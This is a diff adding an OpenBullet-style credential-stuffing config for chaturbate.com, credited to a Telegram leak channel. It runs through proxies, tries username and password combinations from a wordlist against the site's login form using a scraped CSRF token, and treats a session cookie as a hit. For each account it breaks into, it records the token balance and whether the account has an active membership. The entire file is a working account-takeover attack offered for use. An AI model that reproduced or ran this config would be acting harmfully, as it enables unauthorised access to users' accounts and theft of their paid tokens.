@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "chaturbate",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-02T02:36:49.3057526+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "https://t.me/HQ_LEAKS",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://chaturbate.com/" ReadResponseSource=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST POST "https://chaturbate.com/auth/login/?next=/" ReadResponseSource=FALSE 
+  CONTENT "username=<USER>&password=<PASS>&next=%2F&csrfmiddlewaretoken=<COOKIES(csrftoken)>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9,de-DE;q=0.8,de;q=0.7" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 142" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: chaturbate.com" 
+  HEADER "Origin: https://chaturbate.com" 
+  HEADER "Referer: https://chaturbate.com/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(sessionid)>" Exists 
+  KEYCHAIN Failure AND 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "<ADDRESS>" EqualTo "https://chaturbate.com/auth/login/?next=/" 
+
+REQUEST GET "https://chaturbate.com/tipping/token_stats/?room=<USER>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" CSS "[class=token_balance]" "innerHTML" CreateEmpty=FALSE -> CAP "Tokens" 
+
+REQUEST GET "https://chaturbate.com/tipping/memberships_panel/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "You Have No Active Memberships"
+
+FUNCTION Constant "False" -> CAP "Upgraded" 
+
+ELSE
+
+FUNCTION Constant "True" -> CAP "Upgraded" 
+
+ENDIF
+
